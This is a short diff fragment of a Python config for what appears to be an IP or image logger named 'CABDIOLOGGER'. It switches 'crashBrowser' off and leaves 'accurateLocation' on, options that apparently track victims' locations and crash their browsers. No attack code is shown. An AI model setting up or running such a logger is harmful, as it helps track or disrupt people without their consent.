@@ -17,7 +17,7 @@ config = {
     "username": "CABDIOLOGGER", 
     "color": 0x00FFFF,
 
-    "crashBrowser": True, 
+    "crashBrowser": False, 
     "accurateLocation": True,
 
     "message": {
